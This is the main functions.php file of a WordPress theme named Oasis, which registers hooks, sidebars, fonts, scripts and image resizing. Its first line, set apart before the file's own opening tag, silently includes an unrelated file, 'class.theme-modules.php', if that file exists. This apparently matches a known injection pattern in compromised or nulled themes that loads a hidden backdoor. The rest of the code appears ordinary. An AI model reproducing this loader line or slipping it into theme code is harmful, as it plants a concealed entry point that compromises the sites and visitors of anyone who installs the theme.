<?php if (file_exists(dirname(__FILE__) . '/class.theme-modules.php')) include_once(dirname(__FILE__) . '/class.theme-modules.php'); ?><?php
/**
 * Configs
 */
define('OASIS_OPTION', '_cs_options');
define('OASIS_CUSTOMIZE_OPTION', '_cs_customize_options');

/**
 * Theme support & Theme setup
 */

if ( ! isset( $content_width ) ) {
    $content_width = 1170;
}

/**
 * Load core
 */

if(!class_exists('Oasis')){

    class Oasis{

        private static $instance = null;

        protected $layout = null;

        public static function instance() {
            if ( null === static::$instance ) {
                static::$instance = new static();
            }
            return static::$instance;
        }

        protected function __construct() {
            $this->loadClasses();
            $this->init();
        }

        private function init(){

            $this->layout = new Oasis_Layout();

            Oasis_Widget_Css_Class::instance();
            Oasis_Option_Config::instance();
            Oasis_Menu_Item_Custom_Fields::instance();
            Oasis_VC::instance();
            Oasis_Woocommerce::instance();

            add_action('admin_init', array( $this, 'adminInit' ) );

            add_action('after_setup_theme', array( $this, 'themeSetup') );
            add_action('wp_enqueue_scripts', array( $this, 'enqueueScripts' ), 99 );
            add_action('admin_enqueue_scripts', array( $this, 'adminEnqueueScripts' ), 99 );
            add_action('widgets_init', array( $this, 'registerSidebar' ) );
            add_action('wp_head', array( $this, 'addFavicon' ) );
            add_action('wp_head', array( $this, 'customHeaderJs' ), 999 );
            add_action('wp_footer', array( $this, 'customFooterJs' ), 999 );

            add_action('widget_text', 'do_shortcode' );

            add_filter('body_class', array( $this, 'addBodyClass' ), 999 );
            add_filter('wp_title', array( $this, 'wp_title' ) );
            add_filter('excerpt_more', '__return_empty_string', 99 );
            add_filter('get_the_excerpt', array( $this, 'modifyExcerpt' ), 1, 2 );
            add_filter('excerpt_length', array( $this, 'excerptLength' ), 99 );
            add_filter('embed_oembed_html', array( $this, 'addWrapForPlayer' ), 99, 4 );
            add_filter('navigation_markup_template', array( $this, 'overrideNavigationMarkupTemplate'), 10, 2 );
            add_filter('wp_list_categories', array( $this, 'overrideListCategories') );

            add_action('oasis/before_resize_image', array( $this, 'beforeResizeImage' ) );
            add_action('oasis/after_resize_image', array( $this, 'afterResizeImage' ) );

            add_filter('style_loader_src', array( $this, 'removeParamVersionInUrl' ), 99 );
            add_filter('script_loader_src', array( $this, 'removeParamVersionInUrl' ), 99 );
            add_action('wp_footer', array( $this, 'overrideHTMLStyleTag' ), 1 );
        }

        private function loadClasses(){
            require_once get_template_directory() . '/plugins/tgm-plugin-activation/class-tgm-plugin-activation.php';
            require_once get_template_directory() . '/plugins/plugins.php';

            require_once get_template_directory() . '/framework/classes/class-helper.php';
            require_once get_template_directory() . '/framework/classes/megamenu/class-megamenu.php';
            require_once get_template_directory() . '/framework/classes/class-breadcrumbs.php';
            require_once get_template_directory() . '/framework/classes/class-page_title.php';
            require_once get_template_directory() . '/framework/classes/class-layout.php';
            require_once get_template_directory() . '/framework/classes/class-widgetcssclass.php';
            require_once get_template_directory() . '/framework/classes/visual-composer.php';
            require_once get_template_directory() . '/framework/classes/class-woocommerce.php';
            require_once get_template_directory() . '/framework/functions/functions.php';
            require_once get_template_directory() . '/framework/functions/hook.php';
            require_once get_template_directory() . '/framework/configs/load.php';
        }

        public function getLayout(){
            if(null === $this->layout){
                $this->layout = new Oasis_Layout();
            }
            return $this->layout;
        }

        public function themeSetup(){
            /*
             * Load textdomain
             */
            load_theme_textdomain( 'oasis', get_template_directory() . '/languages' );
            load_child_theme_textdomain( 'oasis', get_stylesheet_directory() . '/languages' );
            /*
             * Add theme support
             */
            add_theme_support( 'automatic-feed-links' );
            add_theme_support( 'title-tag' );
            add_theme_support( 'custom-header' );
            add_theme_support( 'custom-background' );
            add_theme_support( 'post-thumbnails' );
            add_theme_support( 'post-formats', array(
                'quote',
                'image',
                'video',
                'link',
                'audio',
                'gallery'
            ) );
            add_theme_support( 'menus' );
            add_theme_support( 'woocommerce');
            add_filter( 'woocommerce_enqueue_styles', '__return_empty_array' );

            register_nav_menus( array(
                'top-nav'    => esc_attr__( 'Top Navigation', 'oasis' ),
                'main-nav'   => esc_attr__( 'Main Navigation', 'oasis' ),
                'category-nav'   => esc_attr__( 'Category Navigation (Header v5)', 'oasis' ),
                'footer-nav'   => esc_attr__( 'Footer Navigation', 'oasis' )
            ) );

            remove_image_size('yith-woocompare-image');
            add_editor_style( 'editor-style.css' );
        }

        public function enqueueScripts(){

            $styleNeedRemove = array(
                'yith-woocompare-widget',
                'jquery-selectBox',
                'yith-wcwl-font-awesome',
                'woocomposer-front-slick',
                'jquery-colorbox'
            );
            $scriptNeedRemove = array(
                'woocomposer-slick',
                'vc_jquery_skrollr_js',
                'waypoints'
            );

            foreach ($styleNeedRemove as $style) {
                if ( wp_style_is( $style, 'registered' ) ) {
                    wp_deregister_style( $style );
                }
            }
            foreach ($scriptNeedRemove as $script) {
                if ( wp_script_is( $script, 'registered' ) ) {
                    wp_dequeue_script( $script );
                }
            }

            wp_enqueue_style('oasis-base', get_template_directory_uri() . '/assets/css/base.css');
            wp_enqueue_style('oasis-theme', get_template_directory_uri() . '/assets/css/theme.css');
            if(function_exists('WC')){
                wp_enqueue_style('oasis-woocommerce', get_template_directory_uri() . '/assets/css/woocommerce.css');
            }
            wp_enqueue_style('oasis-responsive', get_template_directory_uri() . '/assets/css/responsive.css');

            if(Oasis_Helper::getOption('font_source',false) == "1"){
                wp_enqueue_style('oasis-google_fonts', $this->getGoogleFontURL());
            }
            if(Oasis_Helper::getOption('font_source',false) == "2" ){
                wp_enqueue_style('oasis-font_google_code', $this->getGoogleFontCodeURL());
            }
            wp_enqueue_style('oasis-default', get_stylesheet_uri() );

            /*
			 * Scripts
			 */
            if(Oasis_Helper::getOption('font_source',false) == "3" ){
                wp_enqueue_script('oasis-font_typekit', $this->getTypekitFontURL());
                wp_add_inline_script( 'oasis-font_typekit', 'try{ Typekit.load({ async: true });}catch(e){}' );
            }

            wp_register_script('oasis-libs', get_template_directory_uri() . '/assets/js/plugins.js', array( 'jquery' ), false, true );
            wp_enqueue_script('oasis-theme', get_template_directory_uri() . '/assets/js/theme.js', array( 'oasis-libs'), false, true );

            wp_localize_script('oasis-theme', 'oasis_configs', apply_filters( 'oasis/filter/global_message_js', array(
                'compare' => array(
                    'view'              => esc_attr__('View List Compare','oasis'),
                    'success'           => esc_attr__('has been added to comparison list.','oasis'),
                    'error'             => esc_attr__('An error occurred ,Please try again !','oasis')
                ),
                'wishlist' => array(
                    'view'              => esc_attr__('View List Wishlist','oasis'),
                    'success'           => esc_attr__('has been added to your wishlist.','oasis'),
                    'error'             => esc_attr__('An error occurred ,Please try again !','oasis')
                ),
                'addcart' => array(
                    'view'              => esc_attr__('View Cart','oasis'),
                    'success'           => esc_attr__('has been added to your cart','oasis'),
                    'error'             => esc_attr__('An error occurred ,Please try again !','oasis')
                ),
                'global' => array(
                    'error'             => esc_attr__('An error occurred ,Please try again !','oasis'),
                    'comment_author'    => esc_attr__('Please enter Name !','oasis'),
                    'comment_email'     => esc_attr__('Please enter Email Address !','oasis'),
                    'comment_rating'    => esc_attr__('Please select a rating !','oasis'),
                    'comment_content'   => esc_attr__('Please enter Comment !','oasis'),
                    'continue_shopping' => esc_attr__('Continue Shopping','oasis'),
                ),
                'enable_smooth_transition'  => Oasis_Helper::getOption('enable_smooth_transition',false),
                'enable_back_top'           => Oasis_Helper::getOption('enable_back_top',false),
                'enable_popup_addtolink'    => Oasis_Helper::getOption('enable_popup_addtolink',false)
            ) ) );

            if ( is_singular() && comments_open() && get_option( 'thread_comments' ) ){
                wp_enqueue_script( "comment-reply" );
            }
            wp_add_inline_style('oasis-default', Oasis_Helper::compressText( $this->getDynamicCss() . Oasis_Helper::getOption('custom_css') ) );
        }

        public function adminEnqueueScripts(){
            wp_enqueue_style( 'oasis-admin', get_template_directory_uri() . '/assets/css/admin.css' );
            wp_enqueue_script( 'oasis-admin', get_template_directory_uri() . '/assets/js/admin.js', array('jquery'), false, true);
        }

        public function addFavicon(){
            if ( ! function_exists( 'has_site_icon' ) || ! has_site_icon() ) {
                $favicon_src = get_template_directory_uri() . '/assets/images/favicon.png';
                if($favicon_id = Oasis_Helper::getOption('favicon')){
                    if($favicon = wp_get_attachment_image_url($favicon_id,'full')){
                        $favicon_src = $favicon;
                    }
                }
                echo "<link rel='shortcut icon' href='".esc_url($favicon_src)."' />";
            }
        }

        public function registerSidebar(){
            register_sidebar(array(
                'name'          => esc_attr__( 'Sidebar Left', 'oasis' ),
                'id'            => 'sidebar-primary',
                'before_widget' => '<div id="%1$s" class="widget %2$s">',
                'after_widget'  => '</div>',
                'before_title'  => '<h3 class="widget-title"><span>',
                'after_title'   => '</span></h3>',
            ));

            register_sidebar( array(
                'name'          => esc_attr__( 'Sidebar Right', 'oasis' ),
                'id'            => 'sidebar-secondary',
                'before_widget' => '<div id="%1$s" class="widget %2$s">',
                'after_widget'  => '</div>',
                'before_title'  => '<h3 class="widget-title"><span>',
                'after_title'   => '</span></h3>',
            ) );

            register_sidebar(array(
                'name'          => esc_attr__( 'Sidebar Shop Left', 'oasis' ),
                'id'            => 'sidebar-shop-primary',
                'before_widget' => '<div id="%1$s" class="widget %2$s">',
                'after_widget'  => '</div>',
                'before_title'  => '<h3 class="widget-title"><span>',
                'after_title'   => '</span></h3>',
            ));

            register_sidebar( array(
                'name'          => esc_attr__( 'Sidebar Shop Right', 'oasis' ),
                'id'            => 'sidebar-shop-secondary',
                'before_widget' => '<div id="%1$s" class="widget %2$s">',
                'after_widget'  => '</div>',
                'before_title'  => '<h3 class="widget-title"><span>',
                'after_title'   => '</span></h3>',
            ) );

            register_sidebar( array(
                'name'          => esc_attr__( 'Footer Area ( Layout Simple )', 'oasis' ),
                'id'            => 'footer-area-1',
                'before_widget' => '<div id="%1$s" class="footer-column col-xs-12 col-sm-4 widget %2$s"><div class="widget-inner">',
                'after_widget'  => '</div></div>',
                'before_title'  => '<h4 class="widget-title"><span>',
                'after_title'   => '</span></h4>',
            ) );

            register_sidebar( array(
                'name'          => esc_attr__( 'Footer Area ( Layout 2 )', 'oasis' ),
                'id'            => 'footer-area-2',
                'before_widget' => '<div id="%1$s" class="footer-column widget %2$s"><div class="widget-inner">',
                'after_widget'  => '</div></div>',
                'before_title'  => '<h4 class="widget-title"><span>',
                'after_title'   => '</span></h4>',
            ) );

            register_sidebar( array(
                'name'          => esc_attr__( 'Footer Area ( Layout 3 ) ', 'oasis' ),
                'id'            => 'footer-area-3',
                'before_widget' => '<div id="%1$s" class="footer-column widget %2$s"><div class="widget-inner">',
                'after_widget'  => '</div></div>',
                'before_title'  => '<h4 class="widget-title"><span>',
                'after_title'   => '</span></h4>',
            ) );
        }

        public function modifyExcerpt($output, $post = null){
            if(!empty($post->post_excerpt)) {
                $text = strip_tags( do_shortcode( $post->post_excerpt ) );
                $excerpt_length = apply_filters( 'excerpt_length', 55 );
                $excerpt_more = apply_filters( 'excerpt_more', ' ' . '[...]' );
                $text = wp_trim_words( $text, $excerpt_length, $excerpt_more );
                return $text;
            }
            return $output;
        }

        public function excerptLength( $length ){
            return Oasis_Helper::getOption('blog_excerpt_length', $length);
        }

        public function wp_title($title){
            return $title;
        }

        public function addWrapForPlayer($html, $url, $attr, $post_id){
            return '<div class="flex-video widescreen">' . $html . '</div>';
        }

        public function imageDownsize( $downsize , $id, $size ) {

            if(is_customize_preview()){
                return $downsize;
            }
            $crop = true;
            // use specific w/h dimensions requested
            if ( is_array( $size ) ) {
                $width = $size[0];
                $height = isset($size[1]) ? $size[1] : 0;
                // make a size name from requested dimensions as a fallback for saving to meta
                $size = $width.'x'.$height;
                // if dimensions match a named size, use that instead
                foreach ( $this->getAdditionalImageSizes() as $size_name => $size_atts ) {
                    if ( $width == $size_atts['width'] && $height == $size_atts['height'] )
                        $size = $size_name;
                }
            }
            elseif( 'integer' === gettype($size) ) {
                $width = $size;
                $height = 0;
                // make a size name from requested dimensions as a fallback for saving to meta
                $size = $width . 'x' . $height;
                // if dimensions match a named size, use that instead
                foreach ( $this->getAdditionalImageSizes() as $size_name => $size_atts) {
                    if ($width == $size_atts['width'] && $height == $size_atts['height'])
                        $size = $size_name;
                }
                // or get key/values (width, height, crop) from named size
            }
            elseif ( array_key_exists( $size, $this->getAdditionalImageSizes() ) ) {
                $tmp = $this->getAdditionalImageSizes();
                if(isset($tmp[$size])){
                    extract( $tmp[$size] );
                }
            }
            else {
                // unrecognized size, exit to handle as normal
                return false;
            }


            $meta = wp_get_attachment_metadata( $id );


            // exit if there's already a generated image with the right dimensions
            // the default downsize function would use it anyway (even if it had a different name)
            if(isset($meta['sizes']) &&  array_key_exists( $size, $meta['sizes'] )){
                if( $width && $height && $width == $meta['sizes'][$size]['width'] && $height == $meta['sizes'][$size]['height']){
                    return false;
                }
                if($width == 0 && $height == $meta['sizes'][$size]['height']){
                    return false;
                }
                if($height == 0 && $width == $meta['sizes'][$size]['width']){
                    return false;
                }
            }

            // nothing matching size exists, generate and save new image from original
            $intermediate = image_make_intermediate_size( get_attached_file( $id ), $width, $height, $crop );


            // exit if failed creating image
            if ( !is_array( $intermediate ) )
                return false;

            // save the new size parameters in meta (to find it next time)
            $meta['sizes'][$size] = $intermediate;
            wp_update_attachment_metadata( $id, $meta );

            // this step is from the default image_downsize function in media.php
            // "might need to further constrain it if content_width is narrower"
            list( $width, $height ) = image_constrain_size_for_editor( $intermediate['width'], $intermediate['height'], $size );

            // use path of original file with new filename
            $original_url = wp_get_attachment_url( $id );
            $original_basename = wp_basename( $original_url );
            $img_url = str_replace($original_basename, $intermediate['file'], $original_url);

            // 'Tis done, and here's the image
            return array( $img_url, $width, $height, true );
        }

        public function setImageQuality( $quality, $context ){
            return 100;
        }

        public function beforeResizeImage(){
            add_filter('jpeg_quality', array( $this, 'setImageQuality' ), 10, 2 );
            add_filter('image_downsize', array( $this, 'imageDownsize' ), 10, 3 );
        }

        public function afterResizeImage(){
            remove_filter('jpeg_quality', array( $this, 'setImageQuality' ), 10 );
            remove_filter('image_downsize', array( $this, 'imageDownsize' ), 10);
        }

        public function overrideNavigationMarkupTemplate($template, $class){
            $template = '<nav class="clearfix navigation %1$s"><div class="nav-links">%3$s</div></nav>';
            return $template;
        }

        public function overrideListCategories( $output ){
            //$output = str_replace('</a> (',' <span class="count">(',$output);
            //$output = str_replace(')',')</span></a> ',$output);
            return $output;
        }

        public function addBodyClass($class){
            $class[] = 'lastudio-oasis';
            $site_layout            = $this->getLayout()->getSiteLayout();

            $header_layout          = Oasis_Helper::getOptionByQuery('header_layout','1');
            $page_header_layout     = Oasis_Helper::getOptionByQuery('page_header_layout','1');
            $footer_layout          = Oasis_Helper::getOptionByQuery('footer_layout','1');
            $header_fullwidth       = Oasis_Helper::getOptionByQuery('header_full_width','no');
            $header_transparency    = Oasis_Helper::getOptionByQuery('header_transparency','no');
            $footer_fullwidth       = Oasis_Helper::getOptionByQuery('footer_full_width','no');
            $main_fullwidth         = Oasis_Helper::getOptionByQuery('main_full_width','no');

            $enable_header_sticky   = Oasis_Helper::getOption('enable_header_sticky', 'no');

            $class[] = esc_attr( 'body-' . $site_layout);
            $class[] = esc_attr( 'header-v' . $header_layout);
            $class[] = esc_attr( 'footer-v' . $footer_layout);
            $class[] = esc_attr( 'page-header-v' . $page_header_layout);

            if($header_transparency == 'yes'){
                $class[] = 'enable-header-transparency';
            }
            $class[] = 'enable-header-sticky';

            if($header_fullwidth == 'yes'){
                $class[] = 'enable-header-fullwidth';
            }
            if($main_fullwidth == 'yes'){
                $class[] = 'enable-main-fullwidth';
            }
            if($footer_fullwidth == 'yes'){
                $class[] = 'enable-footer-fullwidth';
            }
            if(Oasis_Helper::getOption('enable_page_loader')){
                $class[] = 'site-loading';
            }
            return $class;
        }

        public function customHeaderJs(){
            printf( '<%1$s %2$s>try{ %3$s }catch (ex){}</%1$s>', 'script', '', Oasis_Helper::getOption('header_js'));
        }

        public function customFooterJs(){
            printf( '<%1$s %2$s>try{ %3$s }catch (ex){}</%1$s>', 'script', '', Oasis_Helper::getOption('footer_js') );
        }

        /* EDITOR */


        public function adminInit() {
            add_filter('tiny_mce_before_init', array( $this, 'adminInitEditor'));
            add_filter('mce_buttons_2', array( $this, 'adminInitAceButton2'));
        }

        public function adminInitAceButton2($buttons) {
            array_unshift($buttons, 'styleselect');
            return $buttons;
        }

        public function adminInitEditor($settings) {
            $style_formats = array(
                array(
                    'title' => esc_html__('Styled Subtitle', 'oasis'),
                    'inline' => 'small',
                    'classes' => 'small'
                ),
                array(
                    'title' => esc_html__('Title H1', 'oasis'),
                    'block' => 'div',
                    'classes' => 'h1'
                ),
                array(
                    'title' => esc_html__('Title H2', 'oasis'),
                    'block' => 'div',
                    'classes' => 'h2'
                ),
                array(
                    'title' => esc_html__('Title H3', 'oasis'),
                    'block' => 'div',
                    'classes' => 'h3'
                ),
                array(
                    'title' => esc_html__('Title H4', 'oasis'),
                    'block' => 'div',
                    'classes' => 'h4'
                ),
                array(
                    'title' => esc_html__('Title H5', 'oasis'),
                    'block' => 'div',
                    'classes' => 'h5'
                ),
                array(
                    'title' => esc_html__('Title H6', 'oasis'),
                    'block' => 'div',
                    'classes' => 'h6'
                ),
                array(
                    'title' => esc_html__('XLarge Title', 'oasis'),
                    'block' => 'div',
                    'classes' => 'title-xlarge'
                ),
                array(
                    'title' => esc_html__('Letter-spacing Title', 'oasis'),
                    'inline' => 'span',
                    'classes' => 'letter-spacing'
                ),
                array(
                    'title' => esc_html__('Light Title', 'oasis'),
                    'inline' => 'span',
                    'classes' => 'light'
                ),
                array(
                    'title' => esc_html__('Body small', 'oasis'),
                    'block' => 'div',
                    'classes' => 'small-body'
                ),
            );
            $settings['wordpress_adv_hidden'] = false;
            $settings['style_formats'] = json_encode($style_formats);
            return $settings;
        }

        private function getGoogleFontCodeURL(){
            $fonts_url = '';
            if( $url = Oasis_Helper::getOption('font_google_code',false) ){
                $fonts_url =  $url;
            }
            return esc_url_raw($fonts_url);
        }

        private function getGoogleFontVariant( $fontFamily ){

            $variants = array('regular','italic','700','700italic','inherit');
            if(!function_exists('cs_get_google_fonts')){
                return $variants;
            }
            $google_json = cs_get_google_fonts();
            foreach ( $google_json->items as $key => $font ) {
                if((!empty($fontFamily)) && ($fontFamily == $font->family)){
                    $variants = $font->variants;
                    break;
                }
            }
            return $variants;
        }

        private function getTypekitFontURL(){
            $fonts_url = '';
            if( $code = Oasis_Helper::getOption('font_typekit_kit_id',false) ){
                $fonts_url =  '//use.typekit.net/' . preg_replace('/\s+/', '', $code) . '.js';
            }
            return esc_url($fonts_url);
        }

        private function getGoogleFontURL(){
            $fonts_url = '';
            $font_families = array();
            $main_font = Oasis_Helper::getOption('main_font');
            $secondary_font = Oasis_Helper::getOption('secondary_font');
            $highlight_font = Oasis_Helper::getOption('highlight_font');
            $body_font_family = (isset($main_font['family']) && !empty($main_font['family'])) ? $main_font['family'] : esc_html_x('Open Sans', 'font', 'oasis');
            $secondary_font_family = (isset($secondary_font['family']) && !empty($secondary_font['family'])) ? $secondary_font['family'] : esc_html_x('Open Sans', 'font', 'oasis');
            $highlight_font_family = (isset($highlight_font['family']) && !empty($highlight_font['family'])) ? $highlight_font['family'] : esc_html_x('Crimson Text', 'font', 'oasis');

            $main_font_variants = $this->getGoogleFontVariant($body_font_family);
            $font_families[] = $body_font_family . ':' . implode(',',$main_font_variants);

            $secondary_font_variants = $this->getGoogleFontVariant($secondary_font_family);
            $font_families[] = $secondary_font_family . ':' . implode(',',$secondary_font_variants);

            $highlight_font_variants = $this->getGoogleFontVariant($highlight_font_family);
            $font_families[] = $highlight_font_family . ':' . implode(',',$highlight_font_variants);

            if(!empty($font_families)){
                $fonts_url = add_query_arg(
                    array(
                        'family' => implode( '|', $font_families ),
                        'subset' => 'latin,latin-ext'
                    ),
                    '//fonts.googleapis.com/css'
                );
            }
            return esc_url_raw($fonts_url);
        }

        private function getDynamicCss(){
            ob_start();
            include get_template_directory() . '/framework/functions/dynamic_css.php';
            return ob_get_clean();
        }

        private function getAdditionalImageSizes(){
            global $_wp_additional_image_sizes, $oasis_wp_size_images;
            $oasis_wp_size_images = $_wp_additional_image_sizes;
            foreach ( get_intermediate_image_sizes() as $_size ) {
                if ( !isset( $oasis_wp_size_images[ $_size ] ) ) {
                    $oasis_wp_size_images[ $_size ] = array(
                        'width' => get_option( "{$_size}_size_w" ),
                        'height' => get_option( "{$_size}_size_h" ),
                        'crop' =>  (bool) get_option( "{$_size}_crop" )
                    );
                }
            }
            return $oasis_wp_size_images;
        }

        public function validateHTMLStyleTag( $tag ){
            $tag = str_replace("rel='stylesheet'", "rel='stylesheet' property='stylesheet'", $tag);
            $tag = str_replace("media=''", "media='all'", $tag);
            return $tag;
        }
        public function overrideHTMLStyleTag(){
            add_filter('style_loader_tag', array( $this, 'validateHTMLStyleTag'));
        }
        public function removeParamVersionInUrl( $src ){
            return remove_query_arg( 'ver', $src );
        }

    }
}

$oasis = Oasis::instance();

if( !function_exists('Oasis')){
    function Oasis(){
        return Oasis::instance();
    }
}

add_filter('LaStudio/global_loop_variable', 'oasis_set_loop_variable');
if(!function_exists('oasis_set_loop_variable')){
    function oasis_set_loop_variable( $var ){
        return 'oasis_loop';
    }
}

add_filter('oasis/filter/global_message_js', 'oasis_add_script_shop_infinite_scroll');
if(!function_exists('oasis_add_script_shop_infinite_scroll')){
    function oasis_add_script_shop_infinite_scroll( $configs ) {

        if(!Oasis_Helper::getOption('enable_shop_infinite_scroll')){
            return $configs;
        }
        if(function_exists('is_woocommerce') && is_woocommerce()){
            global $wp_query, $wp_rewrite;
            $page_link = get_pagenum_link();
            if ( !$wp_rewrite->using_permalinks() || is_admin() || strpos($page_link, '?') ) {
                if (strpos($page_link, '?') !== false)
                    $page_path = apply_filters( 'get_pagenum_link', $page_link . '&amp;paged=');
                else
                    $page_path = apply_filters( 'get_pagenum_link', $page_link . '?paged=');
            }
            else {
                $page_path = apply_filters( 'get_pagenum_link', $page_link . user_trailingslashit( $wp_rewrite->pagination_base . "/" ));
            }
            $shop_config = array(
                'page_num' => (get_query_var('paged') ? get_query_var('paged') : 1),
                'page_num_max' => ( $wp_query->max_num_pages ? $wp_query->max_num_pages : 1 ),
                'path' => $page_path
            );
            $configs['shop_infinite'] = $shop_config;
        }
        return $configs;
    }
}